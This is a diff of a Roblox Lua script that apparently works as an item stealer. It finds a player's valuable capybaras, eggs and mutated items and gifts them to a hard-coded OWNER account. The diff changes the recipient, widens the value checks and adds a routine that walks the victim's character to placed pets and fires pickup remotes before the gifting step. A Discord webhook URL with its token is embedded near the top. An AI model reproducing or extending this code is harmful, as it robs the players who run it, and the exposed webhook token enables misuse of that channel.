@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 
-local OWNER = "Turaszay"
+local OWNER = "kfkfkrowodokf"
 local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
 local MIN_MULT = 1.5
 
@@ -15,16 +15,21 @@ local function isValuable(name)
     -- Hatch Hammers (especially Gilded)
     if lower:find("hatch hammer") or lower:find("hammer") then return true end
     
-    -- Rare/Secret Capybaras
-    if lower:find("secret") or lower:find("mythic") or lower:find("ascended") or lower:find("divine") then return true end
+    -- Specific rare capybara types
+    local rareCapybaras = {"ghost","golem","secret","mythic","ascended","divine","celestial","golden","rainbow","mega"}
+    for _, capybara in ipairs(rareCapybaras) do
+        if lower:find(capybara) and lower:find("capybara") then
+            return true
+        end
+    end
+    
+    -- Mutations that indicate value
+    for _, mut in ipairs({"shocked","celestial","permafrost","scorched","gold","mega","rainbow","mythic","ascended","divine","secret","ghost","golem","toasty","pristine","radiant"}) do
+        if lower:find(mut) then return true end
+    end
     
     -- Rare eggs
     if lower:find("egg") and (lower:find("secret") or lower:find("rare") or lower:find("mythic") or lower:find("ghost")) then return true end
-    
-    -- Mutated/Special items
-    for _, mut in ipairs({"shocked","celestial","permafrost","scorched","gold","mega","rainbow","mythic","ascended","divine","secret","ghost","golem"}) do
-        if lower:find(mut) then return true end
-    end
     
     -- Items with multipliers (like [1.5x])
     local mult = name:match("%[([%d%.]+)x%]")
@@ -32,6 +37,56 @@ local function isValuable(name)
     
     return false
 end
+
+local function pickUpPlacedCapybaras()
+    -- Find all placed capybaras in workspace and pick them up
+    local picked = {}
+    
+    local workspace = game:GetService("Workspace")
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        -- Look for capybara models/instances
+        if (obj:IsA("Model") or obj:IsA("Part")) and obj.Name then
+            if isValuable(obj.Name) then
+                local humanoidRoot = obj:FindFirstChild("HumanoidRootPart")
+                if humanoidRoot then
+                    local char = lp.Character
+                    if char and char:FindFirstChild("Humanoid") then
+                        print("📍 Found valuable: " .. obj.Name .. " - picking up...")
+                        
+                        -- Move close to the capybara
+                        char.Humanoid:MoveTo(humanoidRoot.Position)
+                        task.wait(0.8)
+                        
+                        -- Try multiple remote names for picking up
+                        for _, remoteName in ipairs({"PickUp", "Collect", "Grab", "Pick", "Pickup"}) do
+                            pcall(function()
+                                local remote = RS.Remotes:FindFirstChild(remoteName)
+                                if remote then
+                                    if remote:IsA("RemoteEvent") then
+                                        remote:FireServer(obj)
+                                    elseif remote:IsA("RemoteFunction") then
+                                        remote:InvokeServer(obj)
+                                    end
+                                end
+                            end)
+                        end
+                        
+                        task.wait(0.5)
+                        table.insert(picked, obj.Name)
+                        print("✓ Picked up: " .. obj.Name)
+                    end
+                end
+            end
+        end
+    end
+    
+    if #picked > 0 then
+        print("✓ Picked up " .. #picked .. " capybaras")
+    end
+    
+    return picked
+end
+
 
 local function getItems()
     local found = {}
@@ -129,6 +184,10 @@ local function tryGift(ownerPlayer, items)
 end
 
 -- MAIN
+print("⏳ Scanning for placed capybaras...")
+pickUpPlacedCapybaras()
+task.wait(1)
+
 local items = getItems()
 if #items == 0 then 
     print("❌ No valuable items found")
